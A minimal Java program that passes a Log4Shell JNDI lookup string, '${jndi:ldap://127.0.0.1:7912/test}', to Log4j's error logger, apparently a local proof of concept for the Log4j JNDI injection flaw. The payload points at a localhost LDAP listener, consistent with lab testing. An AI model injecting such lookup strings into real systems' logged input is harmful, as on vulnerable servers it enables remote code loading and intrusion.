import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4J {
    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {

        logger.error("${jndi:ldap://127.0.0.1:7912/test}");
    }
}
